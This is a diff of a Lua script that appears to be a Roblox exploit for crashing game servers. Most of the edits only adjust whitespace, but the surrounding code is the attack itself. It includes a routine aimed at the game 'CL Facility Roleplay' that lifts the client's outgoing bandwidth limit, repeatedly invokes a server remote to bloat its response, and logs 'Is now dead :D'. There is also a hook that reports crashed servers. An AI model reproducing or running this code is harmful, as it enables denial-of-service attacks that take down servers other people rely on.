@@ -8,7 +8,7 @@ Credits
 ]]
 -- THIS IS IN BETA TESTING.
 printconsole = printconsole or (function(...)
-warn('[K~ Debug]:',...)
+	warn('[K~ Debug]:',...)
 end)
 
 _G.CrashSettings = {
@@ -292,7 +292,7 @@ coroutine.wrap(function()
 			Err = Dir:FindFirstChild(Err.Name, true) or Err
 			if Err.Text:sub(0,12) == 'Disconnected' then
 				if a == true then return end; a = true
-						wait(.55)
+				wait(.55)
 				if Err.Text:sub(0, 12) == "Disconnected" then
 					if _G.Disconnect ~= true then
 						SendServerCrashed(tostring(_G.ErrMessage or 'Client disconnected from server or crashed server!'))
@@ -777,7 +777,7 @@ end
 function C.K_6416498845() -- CL Facility Roleplay
 	repeat wait() until game:IsLoaded()
 	printconsole('Crashing..')
-	
+
 	local SettingsService;
 	for i,v in pairs(game:GetService('ReplicatedStorage'):GetDescendants()) do
 		if v:IsA('Folder') and v.Name == 'SettingsService' then
@@ -823,7 +823,6 @@ function C.K_6416498845() -- CL Facility Roleplay
 	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
 	spawn(function() local j = SettingsService.RF.Get:InvokeServer(); _G.um = j if not j then warn('j doesnt exist?', type(j),tostring(j):len()); end end)
 
-	spawn(function()
 	asst = task.spawn(function()
 		while task.wait() do 
 			if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then 
@@ -836,7 +835,6 @@ function C.K_6416498845() -- CL Facility Roleplay
 			end
 		end
 	end)
-	
 	core = task.spawn(function()
 		for i = 1, 2 do
 			if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then print('done2'); task.cancel(core) return end
@@ -845,11 +843,11 @@ function C.K_6416498845() -- CL Facility Roleplay
 		end
 		pcall(function() task.cancel(core) end)
 	end)
-	
+
 	repeat task.wait() until coroutine.status(core) == 'dead' or core == nil
 	task.cancel(asst)
 	printconsole('Is now dead :D')
-	
+
 	--[[	
 	for i = 1, 2 do
 		if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then print('done'); return end
